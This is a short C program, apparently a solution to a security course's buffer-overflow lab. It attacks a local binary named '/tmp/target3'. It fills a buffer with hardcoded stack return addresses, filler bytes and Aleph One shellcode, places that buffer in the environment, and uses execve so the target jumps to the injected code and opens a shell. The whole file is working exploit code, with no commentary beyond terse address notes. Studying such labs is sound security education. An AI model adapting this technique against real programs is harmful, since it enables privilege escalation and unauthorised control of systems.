#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  
  //add
  // 0xbf ff ff 7f
  args[1] = "\x7f\xff\xff\xbf"; 
  
  args[2] = NULL;
  int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
  char att[81] = "";
  //add + 20
  for (int i=0; i <5 ; i++){
        strcat(att, "\x93\xff\xff\xbf");
  }
  //junk
  strcat(att, "\x41\x41\x41\x41");
  //add+28
  strcat(att, "\x9b\xff\xff\xbf");
  memcpy(att+28 , shellcodeAlephOne , sizeOfShell*sizeof(char));
  
  env[0] = att;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


